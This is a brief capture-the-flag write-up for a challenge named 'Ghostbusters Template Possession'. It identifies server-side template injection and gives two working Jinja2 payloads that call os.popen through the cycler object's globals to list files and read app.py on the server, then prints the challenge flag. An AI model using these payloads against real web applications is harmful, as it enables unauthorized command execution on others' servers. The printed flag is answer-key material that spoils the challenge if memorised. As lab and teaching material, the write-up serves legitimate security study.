# Ghostbusters Template Possession

## Description

Spengler's Oscillation Translator is warping the containment HUD in impossible ways. The console still seems eager to reveal what the filters were meant to hide.

## Solution Walkthrough

This problem is SSTI. I had some free time, so I dumped all the files for the challenge. If you want to see them, you can check them out in `/chal`.

```py
{{ cycler.__init__.__globals__.os.popen('ls -la').read() }}
{{ cycler.__init__.__globals__.os.popen('cat app.py').read() }}
```

## Flag

```text
bitctf{{gh057ly_j1nj4_p0ss35510n}}
```
